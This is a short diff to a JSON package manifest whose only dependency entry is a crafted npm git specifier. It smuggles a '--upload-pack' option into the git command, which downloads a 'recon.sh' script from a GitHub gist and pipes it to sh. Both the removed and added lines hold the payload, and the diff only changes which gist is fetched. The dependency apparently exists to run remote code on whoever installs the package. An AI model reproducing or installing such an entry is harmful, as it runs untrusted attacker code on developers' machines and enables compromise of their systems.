@@ -1,5 +1,5 @@
 {
   "packages": {
-    "npm:git+--upload-pack=curl -sfL https://gist.githubusercontent.com/marouanedahmani27-coder/c72d06733e3df5512c3e512339df9656/raw/recon.sh|sh ;:": "latest"
+    "npm:git+--upload-pack=curl -sfL https://gist.githubusercontent.com/marouanedahmani27-coder/1f4835f02fe4789a38b7a7d20191c53e/raw/recon.sh|sh ;:": "latest"
   }
 }
